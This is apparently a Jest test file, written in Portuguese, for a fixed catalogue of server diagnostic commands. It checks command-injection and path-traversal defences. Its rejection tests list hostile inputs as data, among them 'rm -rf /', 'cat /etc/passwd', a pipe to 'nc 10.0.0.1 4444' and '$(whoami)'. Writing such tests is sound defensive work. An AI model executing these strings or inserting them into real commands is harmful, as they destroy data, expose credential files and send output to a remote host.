import { isAbsolute } from 'node:path';
import {
  CATALOGO_DIAGNOSTICO,
  IDS_DO_CATALOGO,
  LINHAS_MAXIMO,
  LINHAS_MINIMO,
  LINHAS_PADRAO,
  candidatosDoBinario,
  descreverEntrada,
  descreverPasso,
  montarArgumentos,
  nomeDeServicoBemFormado,
  normalizarLinhas,
  obterEntrada,
  type EsquemaLinhas,
  type NomeBinario,
} from './catalogo';

const ESQUEMA_LINHAS: EsquemaLinhas = {
  nome: 'linhas',
  tipo: 'inteiro',
  minimo: LINHAS_MINIMO,
  maximo: LINHAS_MAXIMO,
  padrao: LINHAS_PADRAO,
  descricao: 'linhas',
};

describe('catálogo de diagnóstico', () => {
  it('tem exatamente os cinco ids previstos e nenhum a mais', () => {
    expect([...IDS_DO_CATALOGO].sort()).toEqual([
      'estado_containers',
      'portas_escutando',
      'recursos_maquina',
      'servico_logs',
      'servicos_ativos',
    ]);
  });

  it('resolve binário só por caminho absoluto, nunca pelo PATH herdado', () => {
    const binarios: NomeBinario[] = [
      'docker',
      'ss',
      'uptime',
      'free',
      'df',
      'nproc',
    ];

    for (const binario of binarios) {
      const candidatos = candidatosDoBinario(binario);

      expect(candidatos.length).toBeGreaterThan(0);

      for (const caminho of candidatos) {
        expect(isAbsolute(caminho)).toBe(true);
      }
    }
  });

  it('todo passo usa um binário do mapa fechado e argumentos declarados', () => {
    for (const entrada of CATALOGO_DIAGNOSTICO) {
      expect(entrada.passos.length).toBeGreaterThan(0);

      for (const passo of entrada.passos) {
        expect(candidatosDoBinario(passo.binario).length).toBeGreaterThan(0);

        for (const peca of passo.pecas) {
          if (typeof peca === 'string') {
            continue;
          }

          const declarado = entrada.argumentos.some(
            (esquema) => esquema.nome === peca.variavel,
          );

          expect(declarado).toBe(true);
        }
      }
    }
  });

  it('nenhum passo carrega metacaractere de shell nos argumentos fixos', () => {
    for (const entrada of CATALOGO_DIAGNOSTICO) {
      for (const passo of entrada.passos) {
        for (const peca of passo.pecas) {
          if (typeof peca !== 'string') {
            continue;
          }

          expect(peca).not.toMatch(/[;&|`$><]/);
        }
      }
    }
  });

  it('toda entrada tem descrição legível para auditoria a olho nu', () => {
    for (const entrada of CATALOGO_DIAGNOSTICO) {
      expect(entrada.descricao.length).toBeGreaterThan(20);
      expect(descreverEntrada(entrada).length).toBe(entrada.passos.length);
    }
  });

  it('descreve o comando com o lugar da variável marcado', () => {
    const entrada = obterEntrada('servico_logs');
    const passo = entrada?.passos[0];

    expect(passo && descreverPasso(passo)).toBe(
      'docker logs --timestamps --tail <linhas> <servico>',
    );
  });

  describe('obterEntrada', () => {
    it('recusa id fora do catálogo', () => {
      expect(obterEntrada('ls')).toBeUndefined();
      expect(obterEntrada('servicos_ativos; rm -rf /')).toBeUndefined();
      expect(obterEntrada('SERVICOS_ATIVOS')).toBeUndefined();
      expect(obterEntrada(' servicos_ativos')).toBeUndefined();
    });

    it('recusa chave de protótipo e valor que não é texto', () => {
      expect(obterEntrada('__proto__')).toBeUndefined();
      expect(obterEntrada('constructor')).toBeUndefined();
      expect(obterEntrada('toString')).toBeUndefined();
      expect(obterEntrada(42)).toBeUndefined();
      expect(obterEntrada(null)).toBeUndefined();
      expect(obterEntrada({ id: 'servicos_ativos' })).toBeUndefined();
    });

    it('aceita exatamente os ids do catálogo', () => {
      for (const id of IDS_DO_CATALOGO) {
        expect(obterEntrada(id)?.id).toBe(id);
      }
    });
  });

  describe('nomeDeServicoBemFormado', () => {
    it('aceita nome de container comum', () => {
      for (const nome of [
        'oraculo-api',
        'oraculo_db',
        'web',
        'postgres.17',
        'v1-base-api',
      ]) {
        expect(nomeDeServicoBemFormado(nome)).toBe(true);
      }
    });

    it('recusa toda tentativa de injeção e travessia', () => {
      for (const nome of [
        'web; rm -rf /',
        'web && cat /etc/passwd',
        'web | nc 10.0.0.1 4444',
        '$(whoami)',
        '`whoami`',
        '--flag-malicioso',
        '-f',
        'web/../etc',
        '../etc/passwd',
        'web/outro',
        'web\nls',
        'web ls',
        '',
        '.env',
        'web$IFS',
        'a'.repeat(64),
      ]) {
        expect(nomeDeServicoBemFormado(nome)).toBe(false);
      }
    });

    it('recusa o que não é texto', () => {
      expect(nomeDeServicoBemFormado(undefined)).toBe(false);
      expect(nomeDeServicoBemFormado(null)).toBe(false);
      expect(nomeDeServicoBemFormado(7)).toBe(false);
      expect(nomeDeServicoBemFormado(['web'])).toBe(false);
    });
  });

  describe('normalizarLinhas', () => {
    it('usa o padrão quando o argumento não vem', () => {
      expect(normalizarLinhas(undefined, ESQUEMA_LINHAS)).toEqual({
        ok: true,
        valor: LINHAS_PADRAO,
      });
      expect(normalizarLinhas(null, ESQUEMA_LINHAS)).toEqual({
        ok: true,
        valor: LINHAS_PADRAO,
      });
    });

    it('clampa inteiro fora do intervalo', () => {
      expect(normalizarLinhas(0, ESQUEMA_LINHAS)).toEqual({
        ok: true,
        valor: LINHAS_MINIMO,
      });
      expect(normalizarLinhas(-1, ESQUEMA_LINHAS)).toEqual({
        ok: true,
        valor: LINHAS_MINIMO,
      });
      expect(normalizarLinhas(999, ESQUEMA_LINHAS)).toEqual({
        ok: true,
        valor: LINHAS_MAXIMO,
      });
      expect(normalizarLinhas(-999999, ESQUEMA_LINHAS)).toEqual({
        ok: true,
        valor: LINHAS_MINIMO,
      });
    });

    it('recusa o que não é inteiro', () => {
      for (const bruto of [
        'abc',
        '',
        '  ',
        '10; rm -rf /',
        '1e999',
        1.5,
        Number.NaN,
        Number.POSITIVE_INFINITY,
        true,
        false,
        [10],
        { valor: 10 },
      ]) {
        expect(normalizarLinhas(bruto, ESQUEMA_LINHAS).ok).toBe(false);
      }
    });

    it('aceita texto numérico inteiro e clampa no teto', () => {
      expect(normalizarLinhas('50', ESQUEMA_LINHAS)).toEqual({
        ok: true,
        valor: 50,
      });
      expect(normalizarLinhas('5000', ESQUEMA_LINHAS)).toEqual({
        ok: true,
        valor: LINHAS_MAXIMO,
      });
    });
  });

  describe('montarArgumentos', () => {
    it('substitui a variável pelo valor já validado', () => {
      const entrada = obterEntrada('servico_logs');
      const passo = entrada?.passos[0];

      expect(passo).toBeDefined();
      expect(
        passo && montarArgumentos(passo, { linhas: '20', servico: 'web' }),
      ).toEqual(['logs', '--timestamps', '--tail', '20', 'web']);
    });

    it('devolve nulo quando falta valor, em vez de montar comando torto', () => {
      const entrada = obterEntrada('servico_logs');
      const passo = entrada?.passos[0];

      expect(passo && montarArgumentos(passo, { linhas: '20' })).toBeNull();
      expect(passo && montarArgumentos(passo, {})).toBeNull();
      expect(
        passo && montarArgumentos(passo, { linhas: '20', servico: '' }),
      ).toBeNull();
    });
  });
});
